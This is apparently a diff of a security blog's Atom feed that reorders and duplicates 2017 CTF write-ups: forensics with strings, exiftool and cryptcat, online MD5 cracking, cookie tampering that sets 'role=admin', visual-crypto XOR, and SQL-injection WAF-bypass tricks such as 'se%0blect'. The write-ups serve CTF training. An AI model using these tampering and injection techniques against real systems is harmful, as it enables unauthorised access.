+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : Egypt &amp; UAE National Cyber Security CTF Quals 2017</li>
+<li><strong>Website</strong> : <a href="http://www.cybertalents.com/" target="_blank" rel="external">cybertalents.com</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/445/" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="25-g-p-list-digital-forensics">25 - G&amp;P List - Digital Forensics</h2>
+<blockquote>
+<p>Just Open the File and Capture the flag . Submission in MD5</p>
+<p>Challenge Link: <a href="https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/G%26P+lists.docx" target="_blank" rel="external">https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/G%26P+lists.docx</a></p>
+</blockquote>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ strings G\&amp;P+lists.docx | grep -i flag                                                                               noraj@noraj-pc</div><div class="line">Flag.txt877c1fa0445adaedc5365d9c139c5219PK</div><div class="line">Flag.txt</div></pre></td></tr></table></figure></p>
+<p>You can see the flag right here between <code>Flag.txt</code> and <code>PK</code>. But you can extract the <code>dock</code> as an archive and just read the <code>Flag.txt</code> content.</p>
+<h2 id="25-hidden-message-digital-forensics">25 - Hidden Message - Digital Forensics</h2>
+<blockquote>
+<p>A cyber Criminal is hiding information in the below file . capture the flag ? submit Flag in MD5 Format</p>
+<p>Challenge Link: <a href="https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/hidden_message.jpg" target="_blank" rel="external">https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/hidden_message.jpg</a></p>
+</blockquote>
+<p>Let's see exif metadata:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ exiftool hidden_message.jpg | grep -i Notice                                                                     noraj@noraj-pc</div><div class="line">Copyright Notice                : b1a1f2855d2428930e0c9c4ce10500d5</div></pre></td></tr></table></figure></p>
+<h2 id="25-crack-the-hash-cryptography">25 - Crack the Hash - Cryptography</h2>
+<blockquote>
+<p>A hacker leaked the below hash online.Can you crack it to know the password of the CEO? 1ab566b9fa5c0297295743e7c2a6ec27</p>
+</blockquote>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ hashid 1ab566b9fa5c0297295743e7c2a6ec27</div><div class="line">Analyzing &apos;1ab566b9fa5c0297295743e7c2a6ec27&apos;</div><div class="line">[+] MD2</div><div class="line">[+] MD5</div><div class="line">[+] MD4</div><div class="line">[+] Double MD5</div><div class="line">[+] LM</div><div class="line">[+] RIPEMD-128</div><div class="line">[+] Haval-128</div><div class="line">[+] Tiger-128</div><div class="line">[+] Skein-256(128)</div><div class="line">[+] Skein-512(128)</div><div class="line">[+] Lotus Notes/Domino 5</div><div class="line">[+] Skype</div><div class="line">[+] Snefru-128</div><div class="line">[+] NTLM</div><div class="line">[+] Domain Cached Credentials</div><div class="line">[+] Domain Cached Credentials 2</div><div class="line">[+] DNSSEC(NSEC3)</div><div class="line">[+] RAdmin v2.x</div></pre></td></tr></table></figure></p>
+<p>It must be a MD5 hash. I used the <code>findmyhash</code> script but had no result. Then I tried online on <a href="https://hashkiller.co.uk/md5-decrypter.aspx" target="_blank" rel="external">hashkiller</a>.</p>
+<p>The flag was <code>Iamtheflag</code>.</p>
+<h2 id="50-admin-has-the-power-web-security">50 - Admin has the power - Web Security</h2>
+<p>If we take a look at the source code we can see:</p>
+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> remove this line ,  for maintenance purpose use this info (user:support password:x34245323)--&gt;</span></div></pre></td></tr></table></figure></p>
+<p>And if we login as the <code>support</code> user we get the following message:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi support</div><div class="line">Your privilege is support , may be you need better privilages !!</div></pre></td></tr></table></figure></p>
+<p>Our cookie look likes this: <code>PHPSESSID=uq82s6g3kdbknicsj8eb040pj0; role=support</code>. Maybe we can change the <code>role</code>.</p>
+<p>We just used burp as proxy to intercept our request and change our cookie to <code>PHPSESSID=uq82s6g3kdbknicsj8eb040pj0; role=admin</code>.</p>
+<p>The result is:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi admin</div><div class="line">Admin Secret flag : hiadminyouhavethepower</div></pre></td></tr></table></figure></p>
+<h2 id="50-cypher-anxiety-digital-forensics">50 - Cypher Anxiety - Digital Forensics</h2>
+<p><strong>Warning</strong>: We get the picture but we didn't get the right flag.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ strings find\ the\ image.pcap| head -11</div><div class="line">Hey bro</div><div class="line">S\U</div><div class="line">Sup supp, are we ready</div><div class="line">yeah, u got the files?</div><div class="line">yes but i think the channel is not secured</div><div class="line">the UTM will block the file transfer as the DLP module is active</div><div class="line">ok we can use cryptcat</div><div class="line">ok what the password then</div><div class="line">let it be P@ssawordaya</div><div class="line">hhh, ok</div><div class="line">listen on 7070 and ill send you the file , bye</div></pre></td></tr></table></figure></p>
+<p>So they use cryptcat over the port 7070 with the secret key <code>P@ssawordaya</code>.</p>
+<p>With wireshark let's filter <code>tcp.port == 7070</code>, then flow TCP stream and save it as raw file.</p>
+<p>Then open a netcat client on localhost: <code>netcat localhost 7070 &lt; crypted.file</code>.</p>
+<p>And open a cryptcat listener on localhost: <code>cryptcat -l -k P@ssawordaya -p 7070 &gt; decrypted.file</code>.</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$ file decrypted.jpeg              noraj@noraj-pc</div><div class="line">decrypted.jpeg: JPEG image data, JFIF standard 1.02, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, orientation=upper-left, xresolution=98, yresolution=106, resolutionunit=2, software=Adobe Photoshop 7.0, datetime=2012:07:30 17:31:00]</div><div class="line"></div><div class="line">$ binwalk decrypted.jpeg           noraj@noraj-pc</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.02</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">324           0x144           JPEG image data, JFIF standard 1.02</div><div class="line">4279          0x10B7          JPEG image data, JFIF standard 1.02</div><div class="line">7186          0x1C12          Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&apos; xmlns:iX=&apos;http://ns.adobe.com/iX/1.0/&apos;&gt;</div><div class="line">7355          0x1CBB          Unix path: /ns.adobe.com/xap/1.0/mm/&apos;&gt;</div><div class="line"></div><div class="line">$ exiftool decrypted.jpeg| grep -i &quot;thumbnail image&quot;</div><div class="line">Thumbnail Image                 : (Binary data 2561 bytes, use -b option to extract)</div><div class="line"></div><div class="line">$ exiftool -b -ThumbnailImage decrypted.jpeg &gt; thumb.jpeg</div></pre></td></tr></table></figure></p>
+<p>Both submiting md5 hash of the picture or the thumbnail failed. We didn't get the flag.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
+    
+      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
   
   <entry>
     <title>ASIS CTF Quals 2017 - Write-ups</title>
@@ -403,113 +779,6 @@
   </entry>
   
   <entry>
-    <title>Egypt &amp; UAE National Cyber Security CTF Quals 2017 - Write-ups</title>
-    <link href="https://rawsec.ml/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/"/>
-    <id>https://rawsec.ml/en/Egypt-UAE-National-Cyber-Security-CTF-2017-Quals-write-ups/</id>
-    <published>2017-04-09T22:00:00.000Z</published>
-    <updated>2017-04-09T22:53:12.555Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : Egypt &amp; UAE National Cyber Security CTF Quals 2017</li>
-<li><strong>Website</strong> : <a href="http://www.cybertalents.com/" target="_blank" rel="external">cybertalents.com</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/445/" target="_blank" rel="external">link</a></li>
-</ul>
-<h2 id="25-g-p-list-digital-forensics">25 - G&amp;P List - Digital Forensics</h2>
-<blockquote>
-<p>Just Open the File and Capture the flag . Submission in MD5</p>
-<p>Challenge Link: <a href="https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/G%26P+lists.docx" target="_blank" rel="external">https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/G%26P+lists.docx</a></p>
-</blockquote>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ strings G\&amp;P+lists.docx | grep -i flag                                                                               noraj@noraj-pc</div><div class="line">Flag.txt877c1fa0445adaedc5365d9c139c5219PK</div><div class="line">Flag.txt</div></pre></td></tr></table></figure></p>
-<p>You can see the flag right here between <code>Flag.txt</code> and <code>PK</code>. But you can extract the <code>dock</code> as an archive and just read the <code>Flag.txt</code> content.</p>
-<h2 id="25-hidden-message-digital-forensics">25 - Hidden Message - Digital Forensics</h2>
-<blockquote>
-<p>A cyber Criminal is hiding information in the below file . capture the flag ? submit Flag in MD5 Format</p>
-<p>Challenge Link: <a href="https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/hidden_message.jpg" target="_blank" rel="external">https://s3-eu-west-1.amazonaws.com/talentchallenges/Forensics/hidden_message.jpg</a></p>
-</blockquote>
-<p>Let's see exif metadata:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ exiftool hidden_message.jpg | grep -i Notice                                                                     noraj@noraj-pc</div><div class="line">Copyright Notice                : b1a1f2855d2428930e0c9c4ce10500d5</div></pre></td></tr></table></figure></p>
-<h2 id="25-crack-the-hash-cryptography">25 - Crack the Hash - Cryptography</h2>
-<blockquote>
-<p>A hacker leaked the below hash online.Can you crack it to know the password of the CEO? 1ab566b9fa5c0297295743e7c2a6ec27</p>
-</blockquote>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ hashid 1ab566b9fa5c0297295743e7c2a6ec27</div><div class="line">Analyzing &apos;1ab566b9fa5c0297295743e7c2a6ec27&apos;</div><div class="line">[+] MD2</div><div class="line">[+] MD5</div><div class="line">[+] MD4</div><div class="line">[+] Double MD5</div><div class="line">[+] LM</div><div class="line">[+] RIPEMD-128</div><div class="line">[+] Haval-128</div><div class="line">[+] Tiger-128</div><div class="line">[+] Skein-256(128)</div><div class="line">[+] Skein-512(128)</div><div class="line">[+] Lotus Notes/Domino 5</div><div class="line">[+] Skype</div><div class="line">[+] Snefru-128</div><div class="line">[+] NTLM</div><div class="line">[+] Domain Cached Credentials</div><div class="line">[+] Domain Cached Credentials 2</div><div class="line">[+] DNSSEC(NSEC3)</div><div class="line">[+] RAdmin v2.x</div></pre></td></tr></table></figure></p>
-<p>It must be a MD5 hash. I used the <code>findmyhash</code> script but had no result. Then I tried online on <a href="https://hashkiller.co.uk/md5-decrypter.aspx" target="_blank" rel="external">hashkiller</a>.</p>
-<p>The flag was <code>Iamtheflag</code>.</p>
-<h2 id="50-admin-has-the-power-web-security">50 - Admin has the power - Web Security</h2>
-<p>If we take a look at the source code we can see:</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> remove this line ,  for maintenance purpose use this info (user:support password:x34245323)--&gt;</span></div></pre></td></tr></table></figure></p>
-<p>And if we login as the <code>support</code> user we get the following message:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi support</div><div class="line">Your privilege is support , may be you need better privilages !!</div></pre></td></tr></table></figure></p>
-<p>Our cookie look likes this: <code>PHPSESSID=uq82s6g3kdbknicsj8eb040pj0; role=support</code>. Maybe we can change the <code>role</code>.</p>
-<p>We just used burp as proxy to intercept our request and change our cookie to <code>PHPSESSID=uq82s6g3kdbknicsj8eb040pj0; role=admin</code>.</p>
-<p>The result is:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Hi admin</div><div class="line">Admin Secret flag : hiadminyouhavethepower</div></pre></td></tr></table></figure></p>
-<h2 id="50-cypher-anxiety-digital-forensics">50 - Cypher Anxiety - Digital Forensics</h2>
-<p><strong>Warning</strong>: We get the picture but we didn't get the right flag.</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ strings find\ the\ image.pcap| head -11</div><div class="line">Hey bro</div><div class="line">S\U</div><div class="line">Sup supp, are we ready</div><div class="line">yeah, u got the files?</div><div class="line">yes but i think the channel is not secured</div><div class="line">the UTM will block the file transfer as the DLP module is active</div><div class="line">ok we can use cryptcat</div><div class="line">ok what the password then</div><div class="line">let it be P@ssawordaya</div><div class="line">hhh, ok</div><div class="line">listen on 7070 and ill send you the file , bye</div></pre></td></tr></table></figure></p>
-<p>So they use cryptcat over the port 7070 with the secret key <code>P@ssawordaya</code>.</p>
-<p>With wireshark let's filter <code>tcp.port == 7070</code>, then flow TCP stream and save it as raw file.</p>
-<p>Then open a netcat client on localhost: <code>netcat localhost 7070 &lt; crypted.file</code>.</p>
-<p>And open a cryptcat listener on localhost: <code>cryptcat -l -k P@ssawordaya -p 7070 &gt; decrypted.file</code>.</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">$ file decrypted.jpeg              noraj@noraj-pc</div><div class="line">decrypted.jpeg: JPEG image data, JFIF standard 1.02, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, orientation=upper-left, xresolution=98, yresolution=106, resolutionunit=2, software=Adobe Photoshop 7.0, datetime=2012:07:30 17:31:00]</div><div class="line"></div><div class="line">$ binwalk decrypted.jpeg           noraj@noraj-pc</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.02</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">324           0x144           JPEG image data, JFIF standard 1.02</div><div class="line">4279          0x10B7          JPEG image data, JFIF standard 1.02</div><div class="line">7186          0x1C12          Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&apos; xmlns:iX=&apos;http://ns.adobe.com/iX/1.0/&apos;&gt;</div><div class="line">7355          0x1CBB          Unix path: /ns.adobe.com/xap/1.0/mm/&apos;&gt;</div><div class="line"></div><div class="line">$ exiftool decrypted.jpeg| grep -i &quot;thumbnail image&quot;</div><div class="line">Thumbnail Image                 : (Binary data 2561 bytes, use -b option to extract)</div><div class="line"></div><div class="line">$ exiftool -b -ThumbnailImage decrypted.jpeg &gt; thumb.jpeg</div></pre></td></tr></table></figure></p>
-<p>Both submiting md5 hash of the picture or the thumbnail failed. We didn't get the flag.</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
-    
-      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Install BlackArch Linux on top of ArchLinux without gnupg / behind a proxy</title>
     <link href="https://rawsec.ml/en/archlinux-install-blackarch-without-gnupg-behind-proxy/"/>
     <id>https://rawsec.ml/en/archlinux-install-blackarch-without-gnupg-behind-proxy/</id>
@@ -541,88 +810,6 @@
       <category term="proxy" scheme="https://rawsec.ml/tags/proxy/"/>
     
       <category term="archlinux" scheme="https://rawsec.ml/tags/archlinux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VolgaCTF 2017 Quals - VC - Crypto</title>
-    <link href="https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/"/>
-    <id>https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/</id>
-    <published>2017-03-25T23:00:00.000Z</published>
-    <updated>2017-03-26T22:01:33.467Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : VolgaCTF 2017 Quals</li>
-<li><strong>Website</strong> : <a href="https://quals.2017.volgactf.ru/" target="_blank" rel="external">quals.2017.volgactf.ru</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/374" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="description">Description</h3>
-<blockquote>
-<p>There are files A.png and B.png. But where's the flag?</p>
-<p><a href="https://quals.2017.volgactf.ru/files/lch5o23ids28n26t9fe7vov2qfclz9rp/A.png" target="_blank" rel="external">A.png</a></p>
-<p><a href="https://quals.2017.volgactf.ru/files/lch5o23ids28n26t9fe7vov2qfclz9rp/B.png" target="_blank" rel="external">B.png</a></p>
-</blockquote>
-<p><code>A.png</code>:</p>
-<p><img src="http://i.imgur.com/Jj8s6vX.png" alt="A"></p>
-<p><code>B.png</code>:</p>
-<p><img src="http://i.imgur.com/gd3iCKb.png" alt="B"></p>
-<h2 id="solution">Solution</h2>
-<p>If you know <a href="https://en.wikipedia.org/wiki/One-time_pad" target="_blank" rel="external">OTP</a> you must know this famous attack on <a href="http://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse" target="_blank" rel="external">pad reused</a>.</p>
-<p>You can also see some black lines on image B. Now let's XOR image A and B (with <a href="http://stackoverflow.com/questions/8504882/searching-for-a-way-to-do-bitwise-xor-on-images" target="_blank" rel="external">ImageMagick</a>):</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ convert A.png B.png -fx &quot;(((255*u)&amp;(255*(1-v)))|((255*(1-u))&amp;(255*v)))/255&quot; out.png</div></pre></td></tr></table></figure></p>
-<p>And now we get the result:</p>
-<p><img src="http://i.imgur.com/8uwlM0o.png" alt="out"></p>
-<p>Flag is: <code>VolgaCTF{Classic_secret_sharing_scheme}</code>.</p>
-<p><strong>Note</strong>: <em>VC</em> is for <em>Visual Cryptography</em></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
   </entry>
   
@@ -860,46 +1047,11 @@
   </entry>
   
   <entry>
-    <title>ArchLinux - Pacman error: $filename exists in filesystem</title>
-    <link href="https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/"/>
-    <id>https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/</id>
-    <published>2017-03-20T23:00:00.000Z</published>
-    <updated>2017-03-21T23:03:54.744Z</updated>
-    
-    <content type="html"><![CDATA[<p>Before each update, check <a href="https://www.archlinux.org/news/" target="_blank" rel="external">Archlinux news</a>, there may be special instructions.</p>
-<p>When updating you system with <code># pacman -Syu</code> you may sometimes encounter this error:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: could not prepare transaction</div><div class="line">error: failed to commit transaction (conflicting files)</div><div class="line">libname: /absolut/file/path exists in filesystem</div><div class="line">Errors occurred, no packages were upgraded.</div></pre></td></tr></table></figure></p>
-<p><code>pacman</code> has detected a file conflict, and is preventing you to overwrite those files. So it's user responsability to take a decision.</p>
-<p>To solve this you have to check that those files are not used by any installed package with the command: <code>$ pacman -Qo /absolut/file/path</code>.</p>
-<p>If no package is using the file you will get this normal error:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ pacman -Qo /absolut/file/path</div><div class="line">error: No package owns /absolut/file/path</div></pre></td></tr></table></figure></p>
-<p>Now you can rename the file (<code>mv /path/file.ext /path/file.ext.bck</code>), then try the update again <code># pacman -Syu</code> and then remove the, now, useless file (<code>rm /path/file.ext.bck</code>).</p>
-<p>But if the file is used <a href="https://wiki.archlinux.org/index.php/Reporting_bug_guidelines" target="_blank" rel="external">report a bug</a>.</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Before each update, check &lt;a href=&quot;https://www.archlinux.org/news/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Archlinux news&lt;/a&gt;, there may be speci
-    
-    </summary>
-    
-      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
-    
-      <category term="archlinux" scheme="https://rawsec.ml/categories/linux/archlinux/"/>
-    
-    
-      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
-    
-      <category term="archlinux" scheme="https://rawsec.ml/tags/archlinux/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>0CTF 2017 Quals - Write-ups</title>
-    <link href="https://rawsec.ml/en/0CTF-2017-write-ups/"/>
-    <id>https://rawsec.ml/en/0CTF-2017-write-ups/</id>
-    <published>2017-03-20T23:00:00.000Z</published>
-    <updated>2017-03-21T22:21:12.327Z</updated>
+    <title>VolgaCTF 2017 Quals - VC - Crypto</title>
+    <link href="https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/"/>
+    <id>https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/</id>
+    <published>2017-03-25T23:00:00.000Z</published>
+    <updated>2017-03-26T22:01:33.467Z</updated>
     
     <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
 <h3 id="version">Version</h3>
@@ -921,42 +1073,30 @@
 </table>
 <h3 id="ctf">CTF</h3>
 <ul>
-<li><strong>Name</strong> : 0CTF 2017 Quals</li>
-<li><strong>Website</strong> : <a href="https://ctf.0ops.net/" target="_blank" rel="external">ctf.0ops.net</a></li>
+<li><strong>Name</strong> : VolgaCTF 2017 Quals</li>
+<li><strong>Website</strong> : <a href="https://quals.2017.volgactf.ru/" target="_blank" rel="external">quals.2017.volgactf.ru</a></li>
 <li><strong>Type</strong> : Online</li>
 <li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/402" target="_blank" rel="external">link</a></li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/374" target="_blank" rel="external">link</a></li>
 </ul>
-<h2 id="welcome-misc">Welcome - Misc</h2>
+<h3 id="description">Description</h3>
 <blockquote>
-<p>Welcome to 0CTF 2017~</p>
-<p>irc: <a href="http://irc.freenode.net" target="_blank" rel="external">irc.freenode.net</a> #0ctf2017</p>
+<p>There are files A.png and B.png. But where's the flag?</p>
+<p><a href="https://quals.2017.volgactf.ru/files/lch5o23ids28n26t9fe7vov2qfclz9rp/A.png" target="_blank" rel="external">A.png</a></p>
+<p><a href="https://quals.2017.volgactf.ru/files/lch5o23ids28n26t9fe7vov2qfclz9rp/B.png" target="_blank" rel="external">B.png</a></p>
 </blockquote>
-<p><code>flag{Welcome_to_0CTF_2017}</code></p>
-<h2 id="simplesqlin-web">simplesqlin - Web</h2>
-<blockquote>
-<p><a href="http://202.120.7.203" target="_blank" rel="external">http://202.120.7.203</a></p>
-</blockquote>
-<p>The injectable request: <code>http://202.120.7.203/index.php?id=3</code>.</p>
-<p>Keywords blocked:</p>
-<ul>
-<li><code>SELECT</code>, <code>sElEcT</code>, <code>%53elect</code>, <code>sel/**/ect</code> (not blocked but doesn't work), <code>/*!%53eLEct*/</code></li>
-<li><code>FROM</code></li>
-<li><code>WHERE</code></li>
-</ul>
-<p><code>?id=2 order by 3</code> works and <code>?id=2 order by 4</code> doesn't so there is 3 columns in the actual table.</p>
-<p>Keywords blocked need to be escaped, so we need to try some WAF bypass techniques. As you can see in the previous part (<em>Keywords blocked</em>), a lot of tricks don't work but I find one that is working: <code>se%0blect</code>, injecting a character that does nothing in our context like <code>%0b</code> (vertical tab) or <code>%07</code> (bell).</p>
